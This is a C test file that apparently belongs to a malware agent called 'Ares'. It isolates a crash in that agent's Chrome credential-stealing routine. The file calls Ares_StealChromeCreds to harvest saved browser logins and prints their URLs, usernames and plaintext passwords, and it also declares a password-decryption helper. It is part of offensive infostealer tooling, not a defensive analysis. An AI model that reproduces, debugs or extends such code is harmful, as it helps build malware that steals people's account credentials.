/* Minimal test to isolate StealChromeCreds crash */
#include <stdio.h>
#include <windows.h>
#include "agent/native/ares_agent.h"
#include "agent/native/ares_resolve.h"
#include "agent/native/ares_strings.h"

extern int Ares_StealChromeCreds(DECRYPTED_CRED* creds, int max_creds);
extern int Ares_CDP_DecryptPasswords(DECRYPTED_CRED* creds, int max_creds);

int main(void) {
    fprintf(stderr, "[TEST] allocating creds...\n"); fflush(stderr);
    DECRYPTED_CRED* creds = (DECRYPTED_CRED*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, 10 * sizeof(DECRYPTED_CRED));
    if (!creds) { fprintf(stderr, "HeapAlloc failed\n"); return 1; }
    fprintf(stderr, "[TEST] creds=%p sizeof=%d\n", creds, (int)sizeof(DECRYPTED_CRED)); fflush(stderr);
    
    fprintf(stderr, "[TEST] calling StealChromeCreds(10)...\n"); fflush(stderr);
    int n = Ares_StealChromeCreds(creds, 10);
    fprintf(stderr, "[TEST] result=%d\n", n); fflush(stderr);
    
    for (int i = 0; i < n && i < 3; i++) {
        fprintf(stderr, "  [%d] %s | %s | %s\n", i, creds[i].url, creds[i].username, creds[i].password);
    }
    
    HeapFree(GetProcessHeap(), 0, creds);
    fprintf(stderr, "[TEST] done\n");
    return 0;
}
